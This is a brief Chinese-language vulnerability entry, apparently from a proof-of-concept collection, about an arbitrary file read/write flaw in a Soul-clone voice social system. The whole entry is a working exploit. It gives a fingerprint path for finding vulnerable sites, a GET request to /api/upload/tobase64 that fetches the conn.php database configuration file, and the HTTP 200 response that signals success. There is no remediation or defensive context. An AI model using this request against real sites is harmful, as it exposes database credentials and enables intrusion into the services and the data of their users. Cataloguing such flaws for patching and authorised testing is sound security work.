# 某仿soul欲音社交系统存在任意文件读取漏洞

某仿soul欲音社交系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"/public/style/admin/js/jquery.min.js"`
- **请求**：`GET /api/upload/tobase64?file=conn.php HTTP/1.1`
- **响应特征**：200